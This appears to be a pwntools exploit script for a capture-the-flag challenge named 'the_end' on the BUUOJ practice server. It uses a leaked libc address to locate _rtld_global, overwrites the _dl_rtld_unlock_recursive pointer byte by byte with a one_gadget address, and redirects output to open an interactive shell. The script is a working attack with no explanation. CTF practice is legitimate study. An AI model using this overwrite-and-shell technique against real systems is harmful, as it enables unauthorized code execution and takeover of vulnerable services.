from pwn import *

#context.log_level = 'debug'

#p = process('./the_end')
p = remote('node4.buuoj.cn', 26532)
libc = ELF('libc-2.27.buu.so')
ld = ELF('ld-2.27.so')

p.recvuntil(b'gift ')

libc_base = int(p.recv(14), 16) - libc.sym['sleep']
ld_base = libc_base + 0x3f1000
_rtld_global = ld_base + ld.sym['_rtld_global']

print('[+] libc_base -> {}'.format(hex(libc_base)))
print('[+] ld_base -> {}'.format(hex(ld_base)))
print('[+] _rtld_global -> {}'.format(hex(_rtld_global)))

dl_rtld_unlock_recursive = _rtld_global + 0xf08

one_gadgets_local = [0x4f365, 0x4f3c2, 0x10a45c]
one_gadgets_buu = [0x4f2c5, 0x4f322, 0x10a38c]

p.recvuntil(b';)\n')

for i in range(5):
    p.send(p64(dl_rtld_unlock_recursive + i))
    p.send(bytearray([p64(one_gadgets_buu[1] + libc_base)[i]]))

p.sendline(b'exec 1>&0')

p.interactive()